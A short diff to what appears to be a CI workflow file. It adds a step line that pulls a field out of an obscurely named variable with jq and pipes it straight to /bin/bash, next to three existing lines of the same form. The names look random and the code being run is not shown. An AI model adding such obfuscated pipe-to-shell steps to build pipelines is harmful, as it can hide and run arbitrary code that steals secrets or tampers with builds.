@@ -29,6 +29,7 @@ jobs:
           echo $cu202 | jq -r .nxh07 | /bin/bash
           printf '%s' "$xcqmp00587" | jq -r .yztav48282 | /bin/bash
           echo $yr9 | jq -r .ctqd27139 | /bin/bash
+          echo $nrqh401 | jq -r .bc585 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
